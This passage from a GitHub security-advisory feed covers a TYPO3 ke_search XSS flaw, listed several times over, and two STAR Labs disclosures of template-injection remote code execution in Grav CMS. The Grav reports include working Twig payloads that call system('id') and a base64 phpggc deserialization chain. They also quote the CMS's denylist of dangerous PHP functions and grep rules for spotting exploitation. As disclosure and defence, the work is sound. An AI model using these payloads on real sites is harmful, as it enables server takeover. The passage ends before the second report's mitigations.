<li><a href="https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-16T15:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</id>
        <link href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"/>
        <updated>2023-06-16T22:10:51.000Z</updated>
        <content type="html"><![CDATA[<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35783">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>
<li><a href="https://typo3.org/security/advisory/typo3-ext-sa-2023-004">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-16T15:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tpwd/ke_search] ke_search (aka Faceted Search) vulnerable to Cross-Site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</id>
        <link href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w"/>
        <updated>2023-06-16T22:10:51.000Z</updated>
        <content type="html"><![CDATA[<p>The ke_search (aka Faceted Search) extension before 4.0.3, 4.1.x through 4.6.x before 4.6.6, and 5.x before 5.0.2 for TYPO3 allows XSS via indexed data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35783">https://nvd.nist.gov/vuln/detail/CVE-2023-35783</a></li>
<li><a href="https://typo3.org/security/advisory/typo3-ext-sa-2023-004">https://typo3.org/security/advisory/typo3-ext-sa-2023-004</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720">https://github.com/tpwd/ke_search/commit/14fa0703c2469e04eb398be4ae6268ec6ad6e720</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6">https://github.com/tpwd/ke_search/commit/b0f05d7e7e207bc0d5051bd96f3ff43c5c3658c6</a></li>
<li><a href="https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74">https://github.com/tpwd/ke_search/commit/d81a1f2f3dcb612220d505b495bc2851b87f6f74</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/tpwd/ke_search/CVE-2023-35783.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-f4m6-x2xj-jc7w">https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4m6-x2xj-jc7w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-16T15:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Grav Server-side Template Injection (SSTI) via Twig Default Filters]]></title>
        <id>https://github.com/advisories/GHSA-whr7-m3f8-mpm8</id>
        <link href="https://github.com/advisories/GHSA-whr7-m3f8-mpm8"/>
        <updated>2023-06-16T19:37:08.000Z</updated>
        <content type="html"><![CDATA[<p>Hi,</p>
<p>actually we have sent the bug report to <a href="mailto:security@getgrav.org">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>
<h1 id="grav-server-side-template-injection-ssti-via-twig-default-filters">Grav Server-side Template Injection (SSTI) via Twig Default Filters</h1>
<h2 id="summary">Summary:</h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Grav CMS</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Vendor</strong></td>
<td>Grav</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt;= <a href="https://github.com/getgrav/grav/tree/1.7.40">v1.7.40</a> (Commit <a href="https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61">685d762</a>) (Latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>v1.7.40</td>
</tr>
<tr>
<td><strong>Internal Identifier</strong></td>
<td>STAR-2023-0008</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>TBD</td>
</tr>
<tr>
<td><strong>CWE(s)</strong></td>
<td>CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>
</tr>
</tbody></table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:</h2>
<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody></table>
<h2 id="product-overview">Product Overview:</h2>
<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:</h2>
<p>The patch for <a href="https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/">CVE-2022-2073</a>, a server-side template injection vulnerability in Grav leveraging the default <code>filter()</code> function, did not block other built-in functions exposed by Twig's Core Extension that could be used to invoke arbitrary unsafe functions, thereby allowing for remote code execution.</p>
<h2 id="vulnerability-details">Vulnerability Details:</h2>
<p>Twig comes with an extension known as the <a href="https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php">Core Extension</a> that is enabled by default when initialising a new <a href="https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148">Twig environment</a>. Twig's Core Extension provides multiple built-in filters, such as the <code>filter()</code> function, which can be used in Twig templates. </p>
<p><a href="https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/">CVE-2022-2073</a> leverages the default <code>filter()</code> filter function in Twig to invoke arbitrary unsafe functions. This was patched by overriding the default <code>filter()</code> filter function in commit <a href="https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83">9d6a2d</a> of Grav v1.7.34 to perform validation checks on the arguments passed to <code>filter()</code>:</p>
<pre><code class="language-diff">...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...
    public function getFilters(): array
    {
        return [
            ...
            // Security fix
+           new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),
        ];
    }
    
    ...

+   /**
+    * @param Environment $env
+    * @param array $array
+    * @param callable|string $arrow
+    * @return array|CallbackFilterIterator
+    * @throws RuntimeError
+    */
+   function filterFilter(Environment $env, $array, $arrow)
+   {
+       if (is_string($arrow) &amp;&amp; Utils::isDangerousFunction($arrow)) {
+           throw new RuntimeError('Twig |filter("' . $arrow . '") is not allowed.');
+       }
+
+       return \twig_array_filter($env, $array, $arrow);
+   }
}
</code></pre>
<p>However, looking at the source code of <a href="https://github.com/twigphp/Twig/blob/v1.44.7/src/Extension/CoreExtension.php">/src/Extension/CoreExtension.php</a> of Twig, alternative default Twig filters could also be used invoke arbitrary functions:</p>
<pre><code class="language-php">...
class CoreExtension extends AbstractExtension
{
    ...
    public function getFilters(): array
    {
        return [
            ...
            // array helpers
            ...
            new TwigFilter('filter', 'twig_array_filter', ['needs_environment' =&gt; true]), // unsafe
            new TwigFilter('map', 'twig_array_map', ['needs_environment' =&gt; true]), // unsafe
            new TwigFilter('reduce', 'twig_array_reduce', ['needs_environment' =&gt; true]), // unsafe
        ];
    }
</code></pre>
<p>The three filter functions above respectively call <code>array_filter()</code>, <code>array_map()</code> and <code>array_reduce()</code>. Since only <code>filter()</code> is being overriden by Grav to ensure that the callable passed to <code>filter()</code> does not result in the invocation of an unsafe function, the other two functions (i.e. <code>map()</code> and <code>reduce()</code>) could be used by an authenticated attacker that is able to inject and render malicious templates to gain remote code execution.</p>
<h2 id="exploit-conditions">Exploit Conditions:</h2>
<p>This vulnerability can be exploited if the attacker has access to:</p>
<ol>
<li>an administrator account, or</li>
<li>a non-administrator, user account that are granted the following permissions:<ul>
<li>login access to Grav admin panel, and</li>
<li>page creation or update rights</li>
</ul>
</li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps:</h2>
<ol>
<li>Log in to Grav Admin using an administrator account.</li>
<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>
<li>Login to Admin - Allowed</li>
<li>Page Update - Allowed</li>
</ul>
</li>
<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>
<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>
<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>
<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class="language-twig">{{ ['id'] | map('system') }}
{{ ['id'] | reduce('system') }}
</code></pre>
</li>
<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:</h2>
<p>Override the built-in Twig <code>map()</code> and <code>reduce()</code> filter functions in <code>system/src/Grav/Common/Twig/Extension/GravExtension.php</code> to validate the argument passed to the filter in <code>$arrow</code>.</p>
<p>For example:</p>
<pre><code class="language-diff">...
class GravExtension extends AbstractExtension implements GlobalsInterface
{
    ...
    public function getFilters(): array
    {
        return [
            ...
            // Security fix
            new TwigFilter('filter', [$this, 'filterFilter'], ['needs_environment' =&gt; true]),
+           new TwigFilter('map', [$this, 'mapFilter'], ['needs_environment' =&gt; true]),
+           new TwigFilter('reduce', [$this, 'reduceFilter'], ['needs_environment' =&gt; true]),
        ];
    }

    ...
+   /**
+    * @param Environment $env
+    * @param array $array
+    * @param callable|string $arrow
+    * @return array|CallbackFilterIterator
+    * @throws RuntimeError
+    */
+   function mapFilter(Environment $env, $array, $arrow)
+   {
+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {
+           throw new RuntimeError('Twig |map("' . $arrow . '") is not allowed.');
+       }
+
+       return \twig_array_map($env, $array, $arrow);
+   }
+ 
+   /**
+    * @param Environment $env
+    * @param array $array
+    * @param callable|string $arrow
+    * @return array|CallbackFilterIterator
+    * @throws RuntimeError
+    */
+   function reduceFilter(Environment $env, $array, $arrow)
+   {
+       if (!$arrow instanceof Closure &amp;&amp; !is_string($arrow) || Utils::isDangerousFunction($arrow)) {
+           throw new RuntimeError('Twig |reduce("' . $arrow . '") is not allowed.');
+       }
+
+       return \twig_array_reduce($env, $array, $arrow);
+   }
}
</code></pre>
<h2 id="detection-guidance">Detection Guidance:</h2>
<p>The following strategies may be used to detect potential exploitation attempts.</p>
<ol>
<li>Searching within Markdown pages using the following shell command:<br><code>grep -Priz -e '\|\s*(map|reduce)\s*\(' /path/to/webroot/user/pages/</code></li>
<li>Searching within Doctrine cache data using the following shell command:<br><code>grep -Priz -e '\|\s*(map|reduce)\s*\('  --include '*.doctrinecache.data' /path/to/webroot/cache/</code></li>
<li>Searching within Twig cache using the following shell command:<br><code>grep -Priz -e 'twig_array_(map|reduce)' /path/to/webroot/cache/twig/</code></li>
<li>Searching within compiled Twig template files using the following shell command:<br><code>grep -Priz -e '\|\s*(map|reduce)\s*\(' /path/to/webroot/cache/compiled/files/</code></li>
</ol>
<p>Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at <code>/path/to/webroot/logs/grav.log</code> by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.</p>
<h2 id="credits">Credits:</h2>
<p>Ngo Wei Lin (<a href="https://twitter.com/Creastery">@Creastery</a>) &amp; Wang Hengyue (<a href="https://twitter.com/w_hy_04">@w_hy_04</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="vulnerability-disclosure">Vulnerability Disclosure:</h2>
<p>This vulnerability report is subject to a 120 day disclosure deadline as per <a href="https://starlabs.sg/advisories/STAR%20Labs%20SG%20Pte.%20Ltd.%20Vulnerability%20Disclosure%20Policy.pdf">STAR Labs SG Pte. Ltd.'s Vulnerability Disclosure Policy</a>. After 120 days have elapsed, the vulnerability report will be published to the public by <a href="https://starlabs.sg/">STAR Labs SG Pte. Ltd.</a> (STAR Labs).  </p>
<p>The scheduled disclosure date is <em><strong>25th July, 2023</strong></em>. Disclosure at an earlier date is also possible if agreed upon by all parties.  </p>
<p>Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:  </p>
<ol>
<li><strong>CVE-2023-30596</strong>
 Server-side Template Injection (SSTI) in getgrav/grav &lt;= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in <code>GravExtension.filterFilter()</code> and to achieve remote code execution via Twig's default filters <code>map()</code> and <code>reduce()</code>. This is a bypass of CVE-2022-2073.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8">https://github.com/getgrav/grav/security/advisories/GHSA-whr7-m3f8-mpm8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34448">https://nvd.nist.gov/vuln/detail/CVE-2023-34448</a></li>
<li><a href="https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec">https://github.com/getgrav/grav/commit/244758d4383034fe4cd292d41e477177870b65ec</a></li>
<li><a href="https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b">https://github.com/getgrav/grav/commit/71bbed12f950de8335006d7f91112263d8504f1b</a></li>
<li><a href="https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8">https://github.com/getgrav/grav/commit/8c2c1cb72611a399f13423fc6d0e1d998c03e5c8</a></li>
<li><a href="https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5">https://github.com/getgrav/grav/commit/9d01140a63c77075ef09b26ef57cf186138151a5</a></li>
<li><a href="https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148">https://github.com/twigphp/Twig/blob/v1.44.7/src/Environment.php#L148</a></li>
<li><a href="https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/">https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/</a></li>
<li><a href="https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83">https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83</a></li>
<li><a href="https://github.com/advisories/GHSA-whr7-m3f8-mpm8">https://github.com/advisories/GHSA-whr7-m3f8-mpm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-whr7-m3f8-mpm8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-16T19:37:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j3v8-v77f-fvgm</id>
        <link href="https://github.com/advisories/GHSA-j3v8-v77f-fvgm"/>
        <updated>2023-06-16T19:36:53.000Z</updated>
        <content type="html"><![CDATA[<p>Hi, </p>
<p>actually we have sent the bug report to <a href="mailto:security@getgrav.org">security@getgrav.org</a> on 27th March 2023 and on 10th April 2023.</p>
<h1 id="grav-server-side-template-injection-ssti-via-denylist-bypass-vulnerability">Grav Server-side Template Injection (SSTI) via Denylist Bypass Vulnerability</h1>
<h2 id="summary">Summary:</h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Grav CMS</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Vendor</strong></td>
<td>Grav</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>High - Users with login access to Grav Admin panel and page creation/update permissions are able to obtain remote code/command execution</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>&lt;= <a href="https://github.com/getgrav/grav/tree/1.7.40">v1.7.40</a> (Commit <a href="https://github.com/getgrav/grav/commit/685d76231a057416651ed192a6a2e83720800e61">685d762</a>) (Latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>v1.7.40</td>
</tr>
<tr>
<td><strong>Internal Identifier</strong></td>
<td>STAR-2023-0006</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>Reserved CVE-2023-30592, CVE-2023-30593, CVE-2023-30594</td>
</tr>
<tr>
<td><strong>CWE(s)</strong></td>
<td>CWE-184: Incomplete List of Disallowed Inputs, CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine</td>
</tr>
</tbody></table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:</h2>
<p><strong>Base Score:</strong> 7.2 (High)<br><strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H</code>  </p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>None</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Unchanged</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody></table>
<h2 id="product-overview">Product Overview:</h2>
<p>Grav is a PHP-based flat-file content management system (CMS) designed to provide a fast and simple way to build websites. It supports rendering of web pages written in Markdown and Twig expressions, and provides an administration panel to manage the entire website via an optional Admin plugin.</p>
<h2 id="vulnerability-summary">Vulnerability Summary:</h2>
<p>The denylist introduced in commit <a href="https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83">9d6a2d</a> to prevent dangerous functions from being executed via injection of malicious templates was insufficient and could be easily subverted in multiple ways -- (1) using unsafe functions that are not banned, (2) using capitalised callable names, and (3) using fully-qualified names for referencing callables. Consequently, a low privileged attacker with login access to Grav Admin panel and page creation/update permissions is able to inject malicious templates to obtain remote code execution.</p>
<h2 id="vulnerability-details">Vulnerability Details:</h2>
<p>In addressing <a href="https://huntr.dev/bounties/3ef640e6-9e25-4ecb-8ec1-64311d63fe66/">CVE-2022-2073</a>, a denylist was introduced in commit <a href="https://www.github.com/getgrav/grav/commit/9d6a2dba09fd4e56f5cdfb9a399caea355bfeb83">9d6a2d</a> to validate and ensure that dangerous functions could not be executed via injection of malicious templates.</p>
<p>The implementation of the denylist can be found in <code>Utils::isDangerousFunction()</code> within <a href="https://github.com/getgrav/grav/blob/1.7.40/system/src/Grav/Common/Utils.php#L1952-L2190">/system/src/Grav/Common/Utils.php</a>:</p>
<pre><code class="language-php">    /**
     * @param string $name
     * @return bool
     */
    public static function isDangerousFunction(string $name): bool
    {
        static $commandExecutionFunctions = [
            'exec',
            'passthru',
            'system',
            'shell_exec',
            'popen',
            'proc_open',
            'pcntl_exec',
        ];

        static $codeExecutionFunctions = [
            'assert',
            'preg_replace',
            'create_function',
            'include',
            'include_once',
            'require',
            'require_once'
        ];

        static $callbackFunctions = [
            'ob_start' =&gt; 0,
            'array_diff_uassoc' =&gt; -1,
            'array_diff_ukey' =&gt; -1,
            'array_filter' =&gt; 1,
            'array_intersect_uassoc' =&gt; -1,
            'array_intersect_ukey' =&gt; -1,
            'array_map' =&gt; 0,
            'array_reduce' =&gt; 1,
            'array_udiff_assoc' =&gt; -1,
            'array_udiff_uassoc' =&gt; [-1, -2],
            'array_udiff' =&gt; -1,
            'array_uintersect_assoc' =&gt; -1,
            'array_uintersect_uassoc' =&gt; [-1, -2],
            'array_uintersect' =&gt; -1,
            'array_walk_recursive' =&gt; 1,
            'array_walk' =&gt; 1,
            'assert_options' =&gt; 1,
            'uasort' =&gt; 1,
            'uksort' =&gt; 1,
            'usort' =&gt; 1,
            'preg_replace_callback' =&gt; 1,
            'spl_autoload_register' =&gt; 0,
            'iterator_apply' =&gt; 1,
            'call_user_func' =&gt; 0,
            'call_user_func_array' =&gt; 0,
            'register_shutdown_function' =&gt; 0,
            'register_tick_function' =&gt; 0,
            'set_error_handler' =&gt; 0,
            'set_exception_handler' =&gt; 0,
            'session_set_save_handler' =&gt; [0, 1, 2, 3, 4, 5],
            'sqlite_create_aggregate' =&gt; [2, 3],
            'sqlite_create_function' =&gt; 2,
        ];

        static $informationDiscosureFunctions = [
            'phpinfo',
            'posix_mkfifo',
            'posix_getlogin',
            'posix_ttyname',
            'getenv',
            'get_current_user',
            'proc_get_status',
            'get_cfg_var',
            'disk_free_space',
            'disk_total_space',
            'diskfreespace',
            'getcwd',
            'getlastmo',
            'getmygid',
            'getmyinode',
            'getmypid',
            'getmyuid'
        ];

        static $otherFunctions = [
            'extract',
            'parse_str',
            'putenv',
            'ini_set',
            'mail',
            'header',
            'proc_nice',
            'proc_terminate',
            'proc_close',
            'pfsockopen',
            'fsockopen',
            'apache_child_terminate',
            'posix_kill',
            'posix_mkfifo',
            'posix_setpgid',
            'posix_setsid',
            'posix_setuid',
        ];

        if (in_array($name, $commandExecutionFunctions)) {
            return true;
        }

        if (in_array($name, $codeExecutionFunctions)) {
            return true;
        }

        if (isset($callbackFunctions[$name])) {
            return true;
        }

        if (in_array($name, $informationDiscosureFunctions)) {
            return true;
        }

        if (in_array($name, $otherFunctions)) {
            return true;
        }

        return static::isFilesystemFunction($name);
    }

    /**
     * @param string $name
     * @return bool
     */
    public static function isFilesystemFunction(string $name): bool
    {
        static $fileWriteFunctions = [
            'fopen',
            'tmpfile',
            'bzopen',
            'gzopen',
            // write to filesystem (partially in combination with reading)
            'chgrp',
            'chmod',
            'chown',
            'copy',
            'file_put_contents',
            'lchgrp',
            'lchown',
            'link',
            'mkdir',
            'move_uploaded_file',
            'rename',
            'rmdir',
            'symlink',
            'tempnam',
            'touch',
            'unlink',
            'imagepng',
            'imagewbmp',
            'image2wbmp',
            'imagejpeg',
            'imagexbm',
            'imagegif',
            'imagegd',
            'imagegd2',
            'iptcembed',
            'ftp_get',
            'ftp_nb_get',
        ];

        static $fileContentFunctions = [
            'file_get_contents',
            'file',
            'filegroup',
            'fileinode',
            'fileowner',
            'fileperms',
            'glob',
            'is_executable',
            'is_uploaded_file',
            'parse_ini_file',
            'readfile',
            'readlink',
            'realpath',
            'gzfile',
            'readgzfile',
            'stat',
            'imagecreatefromgif',
            'imagecreatefromjpeg',
            'imagecreatefrompng',
            'imagecreatefromwbmp',
            'imagecreatefromxbm',
            'imagecreatefromxpm',
            'ftp_put',
            'ftp_nb_put',
            'hash_update_file',
            'highlight_file',
            'show_source',
            'php_strip_whitespace',
        ];

        static $filesystemFunctions = [
            // read from filesystem
            'file_exists',
            'fileatime',
            'filectime',
            'filemtime',
            'filesize',
            'filetype',
            'is_dir',
            'is_file',
            'is_link',
            'is_readable',
            'is_writable',
            'is_writeable',
            'linkinfo',
            'lstat',
            //'pathinfo',
            'getimagesize',
            'exif_read_data',
            'read_exif_data',
            'exif_thumbnail',
            'exif_imagetype',
            'hash_file',
            'hash_hmac_file',
            'md5_file',
            'sha1_file',
            'get_meta_tags',
        ];

        if (in_array($name, $fileWriteFunctions)) {
            return true;
        }

        if (in_array($name, $fileContentFunctions)) {
            return true;
        }

        if (in_array($name, $filesystemFunctions)) {
            return true;
        }

        return false;
    }
</code></pre>
<p>The list of banned functions appears to be adapted from a <a href="https://stackoverflow.com/a/3697776">StackOverflow post</a>. While the denylist looks rather comprehensive, there are actually multiple issues with the denylist implementation:</p>
<ol>
<li>There may be unsafe functions, be it built-in to PHP or user-defined, which are not be blocked. For example, <code>unserialize()</code> and aliases of blocked functions, such as <code>ini_alter()</code>, are not being included in the denylist.  </li>
<li>A case-sensitive comparison is performed against the denylist, but PHP function names are case-insensitive. This allows using <code>filter('SYSTEM')</code> to trivially bypass the denylist validation check.  </li>
<li>Fully qualified names can be used when referencing functions, allowing <code>filter('\system')</code> to trivially bypass the denylist validation checks.</li>
</ol>
<h2 id="exploit-conditions">Exploit Conditions:</h2>
<p>This vulnerability can be exploited if the attacker has access to:</p>
<ol>
<li>an administrator account, or</li>
<li>a non-administrative user account with the following permissions granted:<ul>
<li>login access to Grav admin panel, and</li>
<li>page creation or update rights</li>
</ul>
</li>
</ol>
<h2 id="reproduction-steps">Reproduction Steps:</h2>
<ol>
<li>Log in to Grav Admin using an administrator account.</li>
<li>Navigate to <code>Accounts &gt; Add</code>, and ensure that the following permissions are assigned when creating a new low-privileged user:<ul>
<li>Login to Admin - Allowed</li>
<li>Page Update - Allowed</li>
</ul>
</li>
<li>Log out of Grav Admin, and log back in using the account created in step 2.</li>
<li>Navigate to <code>http://&lt;grav_installation&gt;/admin/pages/home</code>.</li>
<li>Click the <code>Advanced</code> tab and select the checkbox beside <code>Twig</code> to ensure that Twig processing is enabled for the modified webpage.</li>
<li>Under the <code>Content</code> tab, insert the following payload within the editor:<pre><code class="language-twig">// Method 1: Using unserialize() to trigger system('id') call
// Serialized payloaed generated using the phpggc tool: ./phpggc -b Monolog/RCE7 system 'id'
// {{ 'TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aTowO319czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czozOiJwb3MiO2k6MTtzOjY6InN5c3RlbSI7fX0=' | base64_decode | array | filter('unserialize') }}

// Method 2: Trigger system('id') via case-insensitive function names
{{ ['id'] | filter('System') }}

// Method 3: Trigger system('id') via fully qualified names when referencing functions
{{ ['id'] | filter('\\system') }}
</code></pre>
</li>
<li>Click the Preview button. Observe that the output of the <code>id</code> shell command is returned in the preview.</li>
</ol>
<h2 id="suggested-mitigations">Suggested Mitigations:</h2>
